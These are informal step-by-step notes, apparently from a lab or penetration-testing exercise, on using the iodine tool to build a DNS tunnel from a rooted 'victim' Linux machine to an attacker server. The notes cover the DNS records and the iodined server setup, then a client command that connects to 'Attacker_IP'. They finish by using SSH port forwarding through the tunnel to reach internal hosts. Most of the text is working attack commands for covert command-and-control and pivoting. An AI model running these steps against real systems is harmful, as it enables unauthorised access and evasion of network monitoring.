You need to purchase a domain, maybe from NameCheap.

Go to Advanced DNS and add the 'iod' to an NS Record and an A record and put under Host 'testing' and the IP address of the Linux machine built under Linode or other platforms.

go to code.kyro.se/iodine/check-it/ to check the tunnel.
it should resolve the iod.domain.com to testing.domain.com

git clone the iodine repo to the linux server and install it.

iodined -h

(this will create a new adapter with an IP address)
./iodined -f 172.16.69.1 ios.domain.com
(tunnel password)

go to code.kyro.se/iodine/check-it/ to check the tunnel.
it should resolve the iod.domain.com and it should now get the correct IP address of the Linode server.

You need to root the victim Linux box.
- in our case the 2 servers will NOT be able to ping each other.
- on the victim box run the commands to create the adapter and tunnel

iodine -f -P testPassword Attacker_IP iod.domain.com
(this means that the client with first try to connect to the Attacker_IP address).

(on attacker box)
ifconfig
(we should see the new adapter and if we ping the other private IP, we should get a ping reply)
ping 172.16.69.4

- there's a tunnel between the client/victim and attacker systems!!!!!


ssh into the compromised box:
ssh -L 6969:10.10.10.2:22 root@172.16.69.4
(success!!!!)

nc -nv 127.0.0.1 6969
(got the SSH version number)

nmap -sV -Pn -p 22 127.0.0.1 6969

ssh root@127.0.0.1 -p 6969

- adding the route to the nameserver
(issue with the box freezing, so the routing does not work well with IODINE and it will be VERY SLOOOOW)
